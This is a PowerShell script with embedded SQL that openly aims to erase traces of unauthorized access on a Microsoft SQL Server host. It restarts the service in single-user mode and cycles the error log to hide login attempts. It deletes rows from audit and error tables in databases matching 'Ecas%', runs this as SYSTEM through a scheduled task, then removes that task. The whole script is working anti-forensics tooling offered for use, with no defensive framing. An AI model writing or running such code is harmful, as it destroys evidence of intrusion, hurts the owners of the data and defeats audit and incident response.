# Clean ALL traces of unauthorized access
net stop MSSQLSERVER /y
Start-Sleep 3
cmd /c "net start MSSQLSERVER /m"
Start-Sleep 5

@"
SET QUOTED_IDENTIFIER ON;
SET ANSI_NULLS ON;

-- Cycle error log to hide login attempts
EXEC sp_cycle_errorlog;

-- Clean audit/event tables in all databases
DECLARE @sql NVARCHAR(MAX) = '';
DECLARE @dbs TABLE (name NVARCHAR(200));
INSERT @dbs SELECT name FROM sys.databases WHERE name LIKE 'Ecas%';

DECLARE @db NVARCHAR(200);
DECLARE cur CURSOR FOR SELECT name FROM @dbs;
OPEN cur;
FETCH NEXT FROM cur INTO @db;
WHILE @@FETCH_STATUS = 0
BEGIN
    SET @sql = 'DELETE FROM [' + @db + '].dbo.A_DatabaseLog WHERE Dt_ID >= ''2026040'' OR Dt_ID LIKE ''%cascade%'';';
    EXEC sp_executesql @sql;
    SET @sql = 'DELETE FROM [' + @db + '].dbo.ErrorTable WHERE 1=1;';
    BEGIN TRY EXEC sp_executesql @sql; END TRY BEGIN CATCH END CATCH;
    SET @sql = 'DELETE FROM [' + @db + '].dbo.HardDiskDrivesInfo WHERE 1=1;';
    BEGIN TRY EXEC sp_executesql @sql; END TRY BEGIN CATCH END CATCH;
    FETCH NEXT FROM cur INTO @db;
END;
CLOSE cur; DEALLOCATE cur;

PRINT 'ALL TRACES CLEANED';
"@ | Set-Content 'C:\Temp\ECAS\clean.sql' -Encoding ASCII

$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c sqlcmd -S localhost -E -i "C:\Temp\ECAS\clean.sql" -o "C:\Temp\ECAS\clean-result.txt"'
$principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName 'CleanTraces' -Action $action -Principal $principal -Force | Out-Null
Start-ScheduledTask -TaskName 'CleanTraces'
Start-Sleep 10
if (Test-Path 'C:\Temp\ECAS\clean-result.txt') { Get-Content 'C:\Temp\ECAS\clean-result.txt' }
Unregister-ScheduledTask -TaskName 'CleanTraces' -Confirm:$false -EA SilentlyContinue

net stop MSSQLSERVER /y
Start-Sleep 2
net start MSSQLSERVER
Write-Output 'DONE'
